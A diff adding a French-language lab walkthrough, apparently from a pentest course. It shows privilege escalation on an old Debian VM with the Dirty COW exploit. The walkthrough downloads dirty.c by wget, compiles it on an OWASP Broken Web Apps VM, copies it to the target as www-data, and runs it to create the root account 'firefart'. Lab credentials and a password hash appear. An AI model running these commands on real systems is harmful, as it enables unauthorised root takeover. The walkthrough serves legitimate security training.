@@ -349,3 +349,121 @@ Sur la machine distante.
 ```bash
 wget http://192.168.56.5/linpeas.sh
 ```
+
+On constate qu'on a un ancien noyau Linux. On peut utiliser le fameux __dirty cow__ pour devenir administrateur.
+
+## Récupérer l'exploit
+
+Le site (https://dirtycow.ninja/)[https://dirtycow.ninja/] liste différents exploit pour dirty cow.
+
+On peut cliquer sur le github lier pour récupérer un exploit.
+
+__[https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs](https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs)__
+
+Nous allons ici exploiter le dernier exploit de la liste, __`dirty.c`__.\
+__[https://github.com/FireFart/dirtycow/blob/master/dirty.c](https://github.com/FireFart/dirtycow/blob/master/dirty.c)__
+
+On peut le récupérer avec un __wget__.
+
+    wget https://raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c
+
+### Compiler l'exploit
+
+Notre cible utilise un noyau Linux 32 bits.\
+On peut le voir avec la commande `uname -a`. Le paramètre i686 indique un noyau 32bit.
+
+`Linux debian 2.6.32-5-686 #1 SMP Sun May 6 04:01:19 UTC 2012` __`i686`__ `GNU/Linux`
+
+
+Il va donc falloir compiler l'exploit pour un système 32 bits.\
+On peut utiliser pour cela notre machine "OWASP broken web apps".
+
+1. Démarrer la machine OWASP Broken web Apps dans Virtualbox
+2. Se connecter en SSH sur la machine (root:owaspbwa)
+
+
+
+```bash
+ssh root@192.168.56.101
+```
+
+(déposer une clé SSH : `ssh-copy-id -i ~/.ssh/id_rsa.pub root@192.168.56.101`)..
+
+Pour déposer un fichier, on peut utiliser la commande __`sftp`__.
+
+```bash
+$ sftp root@192.168.56.101   
+Connected to 192.168.56.101.
+
+sftp> put dirty.c
+Uploading dirty.c to /root/dirty.c
+dirty.c 
+
+```
+
+On peut ensuite se reconnecter à la machine, et compiler __`dirty.c`__.
+
+On utilise __`less`__ pour voir les instructions, puis on le compile avec __`gcc`__.
+
+
+```bash
+ssh root@192.168.56.101
+
+root@owaspbwa:~# ls
+dirty.c
+
+root@owaspbwa:~# gcc -pthread dirty.c -o dirty -lcrypt
+root@owaspbwa:~# ls
+dirty  dirty.c
+
+```
+
+Nous avons bien réussi à compiler dirty. On le récupère maintenant avec `sftp`, et on le dépose sur la machine cible.
+
+#### Récupérer le binaire
+```bash
+$ sftp root@192.168.56.101
+Connected to 192.168.56.101.
+
+sftp> get dirty
+Fetching /root/dirty to dirty
+/root/dirty                                                                                                                  100%   12KB   5.6MB/s   00:00    
+sftp> exit
+```
+
+#### Le déposer sur la machine cible
+```bash
+$ ssh www-data@192.168.56.6
+Linux debian 2.6.32-5-686 #1 SMP Sun May 6 04:01:19 UTC 2012 i686
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Wed Dec 16 13:59:05 2020 from 192.168.56.5
+
+$ ./dirty 
+/etc/passwd successfully backed up to /tmp/passwd.bak
+Please enter the new password: 
+Complete line:
+firefart:fi1IpG9ta02N.:0:0:pwned:/root:/bin/bash
+
+mmap: b7796000
+
+```
+
+On attend quelques instants, et on peut maintenant se connecter avec notre nouvel utilisateur __firefart__, et le mot de passe qu'on a définit.
+
+```bash
+$ su firefart
+Password: 
+firefart@debian:/var/www# 
+```
+
+
+
+
+
+
